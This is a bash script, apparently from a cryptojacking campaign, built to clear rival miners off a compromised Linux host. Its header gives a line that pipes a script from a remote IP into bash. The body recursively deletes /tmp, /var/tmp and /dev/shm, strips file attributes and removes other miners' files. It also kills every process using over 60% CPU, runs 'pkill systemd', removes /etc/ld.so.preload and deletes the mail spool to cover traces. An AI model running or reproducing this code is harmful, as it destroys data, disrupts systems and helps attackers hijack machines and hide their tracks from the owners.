#!/bin/bash
# wget -O - http://45.9.148.35/chimaera/sh/clean_v2.sh | bash


ARRAY_SERVICES=("xmrig" "xmrig.service" "moneroocean_miner" "moneroocean_miner.service")
ARRAY_PKILLBIN=("xmrig" "kinsing")


TARGET_HOME_DIRS=(".ins" "..." ".sh" ".local/..." ".wget/...")


HOME_DIR_FILES=(".ins/xmrig-6.8.2/evil_script.py" ".ins/xmrig-6.8.2/config.json" ".ins/xmrig-6.8.2-linux-x64.tar.gz" ".ins/" \
				"xmrig-6.7.2/xmrig" "xmrig-6.7.2/" "xmrig-6.8.1/xmrig" "xmrig-6.8.1/" \
				"/usr/local/lib/libprocesshider.so" "/usr/local/.mysqld/mysqld" "/usr/bin/xmrig" "/usr/bin/config.json" "/usr/bin/systemd-helper" \
				"/root/NBMiner_Linux/nbminer" "/root/NBMiner_Linux/" )

XMRIG_VERSIONS=("6.7.0" "6.7.2" "6.8.1" "6.9.0")


shorten='-q --no-check-certificate -O'
DTF='wget -q --no-check-certificate -O'
	if [ -s "$(which mwget 2>/dev/null 1>/dev/null)" ]; then export DTF="mwget "$shorten; fi
	if [ -s "$(which wget2 2>/dev/null 1>/dev/null)" ]; then export DTF="wget2 "$shorten; fi
	if [ -s "$(which wge 2>/dev/null 1>/dev/null)" ]; then export DTF="wge "$shorten; fi
	if [ -s "$(which wdl 2>/dev/null 1>/dev/null)" ]; then export DTF="wdl "$shorten; fi
	if [ -s "$(which wget 2>/dev/null 1>/dev/null)" ]; then export DTF="wget "$shorten; fi
		if [ -s "$(which mcurl 2>/dev/null 1>/dev/null)" ]; then export DTF="mcurl -s -o"; fi	
		if [ -s "$(which curl2 2>/dev/null 1>/dev/null)" ]; then export DTF="curl2 -s -o"; fi
		if [ -s "$(which cur 2>/dev/null 1>/dev/null)" ]; then export DTF="cur -s -o"; fi
		if [ -s "$(which cdl 2>/dev/null 1>/dev/null)" ]; then export DTF="cdl -s -o"; fi
		if [ -s "$(which curl 2>/dev/null 1>/dev/null)" ]; then export DTF="curl -s -o"; fi


function init_main(){
cleanup_tmp
cleanup_home

}



function cleanup_tmp(){
chmod 1777 /tmp/ /var/tmp/ /dev/shm/ -R 2>/dev/null
chattr -R -ia /tmp/ /var/tmp/ /dev/shm/ 2>/dev/null
rm -f /dev/shm/* 2>/dev/null
rm -f /dev/shm/.* 2>/dev/null
rm -fr /tmp/ /var/tmp/ 2>/dev/null
if [ -d "/tmp/" ]; then rm -f /tmp/* 2>/dev/null ; rm -f /tmp/.* 2>/dev/null ; else mkdir -p /tmp/ ; fi
if [ -d "/var/tmp/" ]; then rm -f /var/tmp/* 2>/dev/null ; rm -f /var/tmp/.* 2>/dev/null ; else mkdir -p /var/tmp/ ; fi
}


function cleanup_home(){
for L_USER in $( ls -1 /home/ ); do 

for XMR_VER in ${XMRIG_VERSIONS[@]}; do if [ -d "/home/"$L_USER"/xmrig-"$XMR_VER"/" ]; then 
chattr -R -ia /home/$L_USER/xmrig-$XMR_VER/ 
chmod 1777 /home/$L_USER/xmrig-$XMR_VER/ -R
rm -fr /home/$L_USER/xmrig-$XMR_VER/ ; fi ; done

for TARGET_DIR in ${TARGET_HOME_DIRS[@]}; do if [ -d "/home/"$L_USER"/"$TARGET_DIR"/" ]; then 
chattr -R -ia /home/$L_USER/$TARGET_DIR/
chmod 1777 /home/$L_USER/$TARGET_DIR/ -R
rm -fr /home/$L_USER/$TARGET_DIR/ ; fi

if [ "$(whoami)" = "root" ]; then if [ -d "/root/"$TARGET_DIR"/" ]; then 
chattr -R -ia /root/$TARGET_DIR/
chmod 1777 /root/$TARGET_DIR/ -R
rm -fr /root/$TARGET_DIR/ ; fi ; fi
done

done


}


function MAIN_FILELIST(){
KIE /root/xmrig-6.8.1/xmrig
KIE /root/xmrig-6.8.1/

KIE /root/.ssh/xmrig
KIE /root/.ssh/config.json

KIE /root/.sh/xmrig
KIE /root/.sh/config.json
KIE /root/.sh/

KIE /home/ciuser/.../systemd
KIE /home/ciuser/.../

KIE /home/jovyan/xmrig-6.8.1/xmrig
KIE /home/jovyan/xmrig-6.8.1/

KIE /home/jovyan/xmrig-6.7.0/systemd
KIE /home/jovyan/xmrig-6.7.0/SHA256SUMS
KIE /home/jovyan/xmrig-6.7.0/config.json
KIE /home/jovyan/xmrig-6.7.0/

KIE /home/jovyan/.local/.../xmrig-6.7.0/systemd
KIE /home/jovyan/.local/.../xmrig-6.7.0/SHA256SUMS
KIE /home/jovyan/.local/.../xmrig-6.7.0/config.json
KIE /home/jovyan/.local/.../xmrig-6.7.0/
KIE /home/jovyan/.local/.../

KIE /home/jovyan/.jupyter/xmrig
KIE /home/jovyan/.jupyter/config.json

KIE /root/c3pool/xmrig
KIE /root/c3pool/

KIE /root/mainscript.sh

KIE /root/.wget/.../.../xmrig-6.9.0/systemd
KIE /root/.wget/

}


function KIE(){
BAD_TARGET=$1

CHECK_DIR=`echo $BAD_TARGET | sed 's/.*\(.\{1\}\)$/\1/'`
if [ "$CHECK_DIR" = "/" ]; then if [ -d "$BAD_TARGET" ]; then echo "FOUND (dir): "$BAD_TARGET 
chattr -R -ia $BAD_TARGET 2>/dev/null
rm -fr $BAD_TARGET
fi; fi

if [ -f "$BAD_TARGET" ]; then echo "FOUND (file): "$BAD_TARGET 
chattr -ia $BAD_TARGET 2>/dev/null ; FILE_PID=$(pidof $BAD_TARGET) ; rm -f $BAD_TARGET 2>/dev/null

if [ ! -z "$FILE_PID" ]; then echo "FOUND: (proc pid)" $FILE_PID ; kill $FILE_PID 2>/dev/null; fi

fi
kill $(ps aux | grep -v grep | awk '{if($3>60.0) print $0}' | awk '{print $2}') 2>/dev/null
#if [ ! -z "$HIGH_PROC" ]; then kill $HIGH_PROC; fi

unset FILE_PID
unset BAD_TARGET
unset HIGH_PROC
}

function KSIE(){
for BAD_SERVICE in ${ARRAY_SERVICES[@]}
do
systemctl stop $BAD_SERVICE 2>/dev/null
systemctl disable $BAD_SERVICE 2>/dev/null
service $BAD_SERVICE stop 2>/dev/null
done
}

function PROC_KILLER(){
if [ -f "/etc/ld.so.preload" ]; then chattr -ia /etc/ld.so.preload ; rm -f /etc/ld.so.preload ; fi
chattr -R -ia /tmp/ 2>/dev/null
chattr -R -ia /var/tmp/ 2>/dev/null
rm -fr /tmp/ 2>/dev/null && mkdir -p /tmp/ 2>/dev/null
rm -fr /var/tmp/ 2>/dev/null && mkdir -p /var/tmp/ 2>/dev/null

pkill xmrig 2>/dev/null
pkill systemd 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/python' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/xmrig' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/mellin' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/zsh.sh' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/zsh' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/sysconfig' | awk '{print $2}') 2>/dev/null
kill $(ps aux | grep -v grep | grep '\.\/mainscript.sh' | awk '{print $2}') 2>/dev/null


ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' >> /tmp/.badprocs 2>/dev/null
while read BADPROC; do kill $BADPROC ; done < /tmp/.badprocs ; rm -f /tmp/.badprocs
}



function KILL_TRACES(){
if ! [ -z "$MAIL" ]; then rm -f $MAIL ; fi


}


init_main
